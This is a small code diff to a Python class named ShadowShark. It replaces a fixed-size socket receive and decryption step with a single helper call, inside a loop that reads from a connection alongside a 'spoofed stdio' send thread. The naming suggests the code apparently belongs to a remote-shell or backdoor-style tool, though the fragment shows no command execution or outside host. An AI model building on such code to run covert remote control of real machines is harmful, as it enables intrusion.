@@ -83,8 +83,7 @@ class ShadowShark:
         spoofed_stdio_send_thread = threading.Thread(target=self.spoofed_stdio_send, daemon=True)
         spoofed_stdio_send_thread.start()
         while True:
-            output = self.connection.recv(1024)
-            output = self.encryption_handler(output, decode=True)
+            output = self.recv_infinite_data()
             if output == 'exit':
                 spoofed_stdio_send_thread.join()
                 sys.exit()
